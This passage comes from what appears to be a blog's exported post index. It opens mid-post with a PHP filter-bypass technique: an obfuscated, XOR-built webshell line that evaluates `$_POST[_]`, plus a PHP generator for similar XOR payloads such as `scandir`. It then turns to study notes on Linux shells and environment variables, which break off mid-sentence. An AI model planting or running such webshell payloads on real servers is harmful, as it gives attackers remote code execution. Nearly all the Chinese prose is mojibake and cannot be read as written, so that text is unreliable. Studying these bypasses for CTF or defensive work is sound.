class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">#æƒ³æ„é€ çš„å­—ç¬¦ä¸²  print_r(scandir(&#x27;.&#x27;))</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;scandir&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$payload</span> .= <span class="string">&#x27;%ff&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>.=<span class="string">&#x27;^&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">127</span>; <span class="variable">$j</span> &lt; <span class="number">255</span>; <span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">#chr(255)é€‰æ‹©å“ªä¸€ä¸ªä¸å¯è§å­—ç¬¦æ¥æ„é€ </span></span><br><span class="line">        <span class="variable">$k</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>) ^ <span class="title function_ invoke__">chr</span>(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$k</span> == <span class="variable">$x</span>[<span class="variable">$i</span>]) </span><br><span class="line">      &#123;</span><br><span class="line">            <span class="variable">$payload</span> .= <span class="string">&#x27;%&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><blockquote><p>$</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨ã€‹ ç¬”è®°</title>
      <link href="/2023/05/31/linux-shell/"/>
      <url>/2023/05/31/linux-shell/</url>
      
        <content type="html"><![CDATA[<p>å‰è¨€ï¼š</p><p>ä»¥ä¸‹å†…å®¹ä¸ºé˜…è¯»<code>Linuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ (å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰) (z-lib.org)</code>ç¬”è®°ã€‚</p><p>æ³¨ï¼šä¸‹é¢ä½¿ç”¨çš„linuxç³»ç»Ÿä¸ºé˜¿é‡Œäº‘æœåŠ¡å™¨Centos7ï¼ˆredhatï¼‰æˆ–è€…kaliï¼ˆdebianï¼‰ç³»ç»Ÿ</p><hr><h1 id="äº†è§£shell"><a href="#äº†è§£shell" class="headerlink" title="äº†è§£shell"></a>äº†è§£shell</h1><h3 id="shellç±»å‹"><a href="#shellç±»å‹" class="headerlink" title="shellç±»å‹"></a>shellç±»å‹</h3><p><img src="/../images/image-20220818151112756-1686151304118.png" alt="image-20220818151112756"></p><blockquote><p>å½“ç”¨æˆ·ç™»å½•ç»ˆç«¯çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šå¯åŠ¨ä¸€ä¸ªé»˜è®¤çš„äº¤äº’å¼shellã€‚</p><p>ç³»ç»Ÿç©¶ç«Ÿå¯åŠ¨å“ªä¸ªshellï¼Œè¿™å–å†³äºç”¨æˆ·IDé…ç½®ç³»ç»Ÿå¯åŠ¨ä»€ä¹ˆæ ·çš„shellç¨‹åºã€‚</p><p>åœ¨&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­ï¼Œåœ¨ç”¨æˆ·IDè®°å½•çš„ç¬¬7ä¸ªå­—æ®µä¸­åˆ—å‡ºäº†é»˜è®¤çš„shellç¨‹åºã€‚</p></blockquote><p>ä¾‹å¦‚åœ¨kaliä¸­ç™»å½•ç»ˆç«¯æ—¶ä½¿ç”¨çš„æ˜¯zshç±»å‹çš„shell.</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">khaz: x:1000:1000:khaz,,,:/home/khaz:/usr/bin/zsh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ ls -F /usr/bin/zsh</span><br><span class="line">/usr/bin/zsh*</span><br></pre></td></tr></table></figure><p>è¯´æ˜&#x2F;usr&#x2F;bin&#x2F;zshæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ ls -l /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4  3æœˆ 14  2022 /bin/sh -&gt; dash</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç”¨æˆ·å’Œç³»ç»Ÿä½¿ç”¨çš„shellç±»å‹ä¸åŒã€‚</p><p>æŸ¥çœ‹æ‰€æœ‰shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat /etc/shells</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br></pre></td></tr></table></figure><blockquote><p>é€šå¸¸è¯´çš„shåªæ˜¯ä¸€ä¸ªè½¯è¿æ¥ï¼Œå¹¶ä¸æ˜¯çœŸçš„æœ‰ä¸€ä¸ªshellå«shã€‚</p><p>åœ¨debianç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘dashï¼›</p><p>åœ¨centosç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘bashã€‚</p></blockquote><h3 id="shellçš„çˆ¶å­å…³ç³»"><a href="#shellçš„çˆ¶å­å…³ç³»" class="headerlink" title="shellçš„çˆ¶å­å…³ç³»"></a>shellçš„çˆ¶å­å…³ç³»</h3><p><img src="/../images/image-20220819202328859-1686151304119.png" alt="image-20220819202328859"></p><p>åœ¨å³è¾¹çš„å‘½ä»¤è¡Œä¸­å¯ä»¥çœ‹åˆ°bashè¿›ç¨‹çš„ppidå°±æ˜¯&#x2F;user&#x2F;bin&#x2F;zshçš„pidï¼Œæ‰€ä»¥äºŒè€…æ˜¯çˆ¶å­å…³ç³»ã€‚</p><p><img src="/../images/image-20220819202343322-1696733797342.png"></p><p>å¤šæ¬¡åˆ›å»ºbash</p><img src="E:\typora img\image-20220819203036919.png" alt="image-20220819203036919" style="zoom: 67%;" /><img src="E:\typora img\image-20220819203046906.png" alt="image-20220819203046906" style="zoom:67%;" /><p>é€€å‡ºå½“å‰shellï¼Œ<code>exit</code></p><img src="E:\typora img\image-20220819203202199.png" alt="image-20220819203202199" style="zoom:67%;" /><p>å¯åŠ¨shellæ—¶çš„å‚æ•°</p><img src="E:\typora img\image-20220923170946734.png" alt="image-20220923170946734" style="zoom:67%;" title=1/><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ bash -r</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$ cd ../</span><br><span class="line">bash: cd: restricted</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤åˆ—è¡¨"><a href="#å‘½ä»¤åˆ—è¡¨" class="headerlink" title="å‘½ä»¤åˆ—è¡¨"></a>å‘½ä»¤åˆ—è¡¨</h3><blockquote><p>ä»¥;éš”å¼€çš„å¤šä¸ªå‘½ä»¤</p></blockquote><p><code>pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL</code></p><p>è¿›ç¨‹åˆ—è¡¨</p><blockquote><p>åˆ›å»ºä¸€ä¸ªå­shellæ¥æ‰§è¡Œå‘½ä»¤åˆ—è¡¨</p></blockquote><p><code> (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</code></p><p><code>echo $BASH_SUBSHELL</code>ï¼šè¾“å‡ºå­shellæ•°é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]#  (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">/etc</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ;(echo $BASH_SUBSHELL))</span><br><span class="line">/root</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæœ‰å‡ ä¸ªæ‹¬å·å°±æœ‰å‡ ä¸ªå­shell</p><h1 id="ä½¿ç”¨linuxç¯å¢ƒå˜é‡"><a href="#ä½¿ç”¨linuxç¯å¢ƒå˜é‡" class="headerlink" title="ä½¿ç”¨linuxç¯å¢ƒå˜é‡"></a>ä½¿ç”¨linuxç¯å¢ƒå˜é‡</h1><ul><li><p>å®šä¹‰</p><blockquote><p><strong>å­˜å‚¨æœ‰å…³shellä¼šè¯å’Œå·¥ä½œç¯å¢ƒçš„ä¿¡æ¯çš„å˜é‡ç§°ä¸ºç¯å¢ƒå˜é‡</strong></p></blockquote></li><li><p>åˆ†ç±»</p><ul><li><p>å…¨å±€å˜é‡</p></li><li><p>å±€éƒ¨å˜é‡</p><blockquote><p>è¿™é‡Œçš„èŒƒå›´æŒ‡çš„æ˜¯å˜é‡å­˜åœ¨äºå“ªäº›shellä¼šè¯ä¸­</p></blockquote></li></ul></li></ul><h3 id="å…¨å±€ç¯å¢ƒå˜é‡"><a href="#å…¨å±€ç¯å¢ƒå˜é‡" class="headerlink" title="å…¨å±€ç¯å¢ƒå˜é‡"></a>å…¨å±€ç¯å¢ƒå˜é‡</h3><blockquote><p>ç³»ç»Ÿç¯å¢ƒå˜é‡åŸºæœ¬ä¸Šéƒ½æ˜¯ä½¿ç”¨å…¨å¤§å†™å­—æ¯ï¼Œä»¥åŒºåˆ«äºæ™®é€šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚</p></blockquote><p>æŸ¥çœ‹å…¨å±€å˜é‡</p><ul><li><p><code>env</code> æˆ–è€…<code>printenv</code>ï¼š<strong>åª</strong>è¾“å‡ºå…¨éƒ¨çš„<strong>å…¨å±€</strong>å˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# env  (printenvè¾“å‡ºçš„ä¸å…¶ç›¸åŒ)</span><br><span class="line">XDG_SESSION_ID=897</span><br><span class="line">HOSTNAME=izwz99bgx9y93dmv0mir0ez</span><br><span class="line">TERM=xterm</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">USER=root</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p><code>printenv  var_name</code>æˆ–è€… <code>echo $var_name</code>ï¼šè¾“å‡ºç‰¹å®šå˜é‡çš„å€¼ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# printenv USER</span><br><span class="line">root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $USER</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>å…¨å±€ç¯å¢ƒå˜é‡å­˜åœ¨äºæ‰€æœ‰çš„shellä¼šè¯ä¸­</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11371 11337  0 20:31 pts/0    00:00:00 bash</span><br><span class="line">root     11382 11371  0 20:31 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11383 11337  0 20:32 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”¨bashå‘½ä»¤ç”Ÿæˆä¸€ä¸ªå­shellåï¼Œæ˜¾ç¤ºäº†HOMEç¯å¢ƒå˜é‡çš„å½“å‰å€¼ï¼Œè¿™ä¸ªå€¼å’Œçˆ¶shellä¸­çš„ä¸€æ¨¡ä¸€æ ·ï¼Œéƒ½æ˜¯&#x2F;rootã€‚</p></blockquote><h3 id="å±€éƒ¨ç¯å¢ƒå˜é‡"><a href="#å±€éƒ¨ç¯å¢ƒå˜é‡" class="headerlink" title="å±€éƒ¨ç¯å¢ƒå˜é‡"></a>å±€éƒ¨ç¯å¢ƒå˜é‡</h3><p>æŸ¥çœ‹å±€éƒ¨å˜é‡</p><blockquote><p>åœ¨Linuxç³»ç»Ÿå¹¶æ²¡æœ‰ä¸€ä¸ªåªæ˜¾ç¤ºå±€éƒ¨ç¯å¢ƒå˜é‡çš„å‘½ä»¤ã€‚</p></blockquote><ul><li><p><code>set</code></p><blockquote><p>setå‘½ä»¤ä¼šæ˜¾ç¤ºä¸ºæŸä¸ªç‰¹å®šè¿›ç¨‹è®¾ç½®çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# set</span><br><span class="line">BASH=/bin/bash</span><br><span class="line">BASHOPTS=checkwinsize:cmdhist:expand_aliases:extquote:force_fignore:histappend:hostcomplete:interactive_comments:login_shell:progcomp:promptvars:sourcepath</span><br><span class="line">BASH_ALIASES=()</span><br><span class="line">BASH_ARGC=()</span><br><span class="line">BASH_ARGV=()</span><br><span class="line">BASH_CMDS=()</span><br><span class="line">BASH_LINENO=()</span><br><span class="line">BASH_SOURCE=()</span><br><span class="line">BASH_VERSINFO=([0]=&quot;4&quot; [1]=&quot;2&quot; [2]=&quot;46&quot; [3]=&quot;2&quot; [4]=&quot;release&quot; [5]=&quot;x86_64-redhat-linux-gnu&quot;)</span><br><span class="line">BASH_VERSION=&#x27;4.2.46(2)-release&#x27;</span><br><span class="line">COLUMNS=210</span><br><span class="line">DIRSTACK=()</span><br><span class="line">EUID=0</span><br><span class="line">GROUPS=()</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>setå‘½ä»¤ä¼šæ˜¾ç¤ºå‡ºå…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚å®ƒè¿˜ä¼šæŒ‰ç…§å­—æ¯é¡ºåºå¯¹ç»“æœè¿›è¡Œæ’åºã€‚</p><p>envå’Œprintenvå‘½ä»¤åŒsetå‘½ä»¤çš„åŒºåˆ«åœ¨äºå‰ä¸¤ä¸ªå‘½ä»¤ä¸ä¼šå¯¹å˜é‡æ’åºï¼Œä¹Ÿä¸ä¼šè¾“å‡ºå±€éƒ¨å˜é‡å’Œç”¨æˆ·å®šä¹‰å˜é‡ã€‚</p></blockquote></li></ul><h3 id="è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡"><a href="#è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡" class="headerlink" title="è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡"></a>è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡</h3><blockquote><p>ä¸€æ—¦å¯åŠ¨äº†bash shellï¼ˆæˆ–è€…æ‰§è¡Œä¸€ä¸ªshellè„šæœ¬ï¼‰ï¼Œå°±èƒ½åˆ›å»ºåœ¨è¿™ä¸ªshellè¿›ç¨‹å†…å¯è§çš„å±€éƒ¨å˜é‡äº†ã€‚</p><p>å¯ä»¥é€šè¿‡ç­‰å·ç»™ç¯å¢ƒå˜é‡èµ‹å€¼ï¼Œå€¼å¯ä»¥æ˜¯æ•°å€¼æˆ–å­—ç¬¦ä¸²ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line"></span><br><span class="line">æ³¨ï¼šå› ä¸ºæ²¡æœ‰å®šä¹‰first_varå˜é‡ï¼Œæ‰€ä»¥è¾“å‡ºä¸ºç©ºã€‚</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# $first_var=hello world</span><br><span class="line">-bash: =hello: command not found</span><br><span class="line">æ³¨ï¼šå®šä¹‰å˜é‡æ—¶æ— éœ€åŠ ä¸Š$</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=hello world</span><br><span class="line">-bash: world: command not found</span><br><span class="line">æ³¨ï¼šåœ¨ä¸ºå˜é‡èµ‹å€¼å­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœå­—ç¬¦ä¸²æœ‰å¼•å·ï¼Œå°±éœ€è¦ç”¨å•å¼•å·æ‹¬èµ·æ¥ã€‚</span><br><span class="line">å¼•ç”¨ï¼šæ²¡æœ‰å•å¼•å·çš„è¯ï¼Œbash shellä¼šä»¥ä¸ºä¸‹ä¸€ä¸ªè¯æ˜¯å¦ä¸€ä¸ªè¦æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line"></span><br><span class="line">root@izwz99bgx9y93dmv0mir0ez ~]# first_var =&#x27;hello world&#x27;</span><br><span class="line">-bash: first_var: command not found</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var= &#x27;hello world&#x27;</span><br><span class="line">-bash: hello world: command not found</span><br><span class="line">æ³¨ï¼šå˜é‡å’Œ=å’Œå€¼ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¦åˆ™shellä¼šæŠŠå…¶å½“æˆå‘½ä»¤ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=&#x27;hello world&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line">hello world</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å±€éƒ¨å˜é‡çš„èŒƒå›´</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11415 11337  0 20:57 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# child_var=&#x27;hello khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line">hello khaz</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®å…¨å±€å˜é‡"><a href="#è®¾ç½®å…¨å±€å˜é‡" class="headerlink" title="è®¾ç½®å…¨å±€å˜é‡"></a>è®¾ç½®å…¨å±€å˜é‡</h3><blockquote><p>åˆ›å»ºå…¨å±€ç¯å¢ƒå˜é‡çš„æ–¹æ³•æ˜¯å…ˆ<strong>åˆ›å»º</strong>ä¸€ä¸ªå±€éƒ¨ç¯å¢ƒå˜é‡ï¼Œç„¶åå†æŠŠå®ƒ<strong>å¯¼å‡º</strong>åˆ°å…¨å±€ç¯å¢ƒä¸­ã€‚</p></blockquote><p><code>export var_name</code>ï¼šå¯¼å‡ºå­shellçš„å±€éƒ¨å˜é‡åˆ°å…¨å±€ç¯å¢ƒä¸­ï¼ˆ<strong>ä¸´æ—¶ä¿®æ”¹</strong>ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps --forest</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">11566 pts/1    00:00:00 bash</span><br><span class="line">11585 pts/1    00:00:00  \_ ps</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=&#x27;khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# export a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>æˆ‘å‘ç°åªèƒ½åœ¨ç™»å½•ç»ˆç«¯çš„é‚£ä¸ªshellä¸­exportï¼Œä¸èƒ½åœ¨å­shellä¸­exportï¼Ÿ</p><p>å› ä¸ºexportçš„ä½œç”¨æ˜¯è®©å­shellå¯ä»¥ç»§æ‰¿çˆ¶shellå¯¼å‡ºè¿‡çš„å˜é‡ã€‚</p><p>å¹¶ä¸”å¦‚æœåœ¨å­shellä¸­ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°çˆ¶shellä¸­è¯¥å…¨å±€å˜é‡çš„å€¼ã€‚</p></blockquote><h3 id="åˆ é™¤ç¯å¢ƒå˜é‡"><a href="#åˆ é™¤ç¯å¢ƒå˜é‡" class="headerlink" title="åˆ é™¤ç¯å¢ƒå˜é‡"></a>åˆ é™¤ç¯å¢ƒå˜é‡</h3><p><code>unset var_name</code>ï¼šåˆ é™¤ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# unset a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®PATHç¯å¢ƒå˜é‡"><a href="#è®¾ç½®PATHç¯å¢ƒå˜é‡" class="headerlink" title="è®¾ç½®PATHç¯å¢ƒå˜é‡"></a>è®¾ç½®PATHç¯å¢ƒå˜é‡</h3><blockquote><p>PATHç¯å¢ƒå˜é‡å®šä¹‰äº†ç”¨äºè¿›è¡Œå‘½ä»¤å’Œç¨‹åºæŸ¥æ‰¾çš„ç›®å½•ã€‚</p></blockquote><p>ä¸‹é¢æ¼”ç¤ºäº†åˆ›å»ºè‡ªå®šä¹‰å‘½ä»¤ï¼Œå¹¶å¯ä»¥åœ¨ä»»ä½•è·¯å¾„ä¸‹ä½¿ç”¨è¯¥å‘½ä»¤ã€‚</p><ul><li><p>åˆ›å»ºè‡ªå®šä¹‰å‘½ä»¤ï¼Œå‘½ä»¤å†…å®¹ä¸ºè¾“å‡ºâ€™hello khazâ€™ï¼Œå¹¶å°†å…¶ç§»åŠ¨åˆ°å­˜æ”¾è‡ªå®šä¹‰å‘½ä»¤çš„ç›®å½•ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# vim hello </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;hello khaz&#x27;</span><br><span class="line">:wq</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mkdir my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mv hello my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>å› ä¸ºä¸å‘½ä»¤ä¸åœ¨åŒä¸€è·¯å¾„ä¸‹ï¼Œæç¤ºæ‰¾ä¸åˆ°å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">-bash: hello: command not found</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹å¹¶å¢åŠ PATHï¼ˆè·¯å¾„ä»¥ï¼šåˆ†éš”ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# PATH=$PATH:/root/my_cmd/</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>å†æ¬¡è¾“å…¥å‘½ä»¤æˆåŠŸæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ç§æ–¹æ³•å¯¹PATHå˜é‡çš„ä¿®æ”¹åªèƒ½æŒç»­åˆ°é€€å‡ºæˆ–é‡å¯ç³»ç»Ÿã€‚</p></blockquote></li></ul><h3 id="è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–"><a href="#è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–" class="headerlink" title="è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–"></a>è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–</h3><blockquote><p>æŠŠæˆ‘ä»¬è®¾ç½®çš„ç¯å¢ƒå˜é‡æ”¾åœ¨shellçš„å¯åŠ¨æ–‡ä»¶&#x2F;ç¯å¢ƒæ–‡ä»¶ä¸­ã€‚</p><p>æˆ–è€…å¼€æœºå¯åŠ¨é¡¹<code>/etc/init.d/</code>å’Œ<code>/etc/profile.d/</code></p></blockquote><ul><li><p>å¯åŠ¨æ–‡ä»¶&#x2F;ç¯å¢ƒæ–‡ä»¶</p><blockquote><p>ç™»å…¥Linuxç³»ç»Ÿå¯åŠ¨ä¸€ä¸ªbash shellæ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹bashä¼šåœ¨å‡ 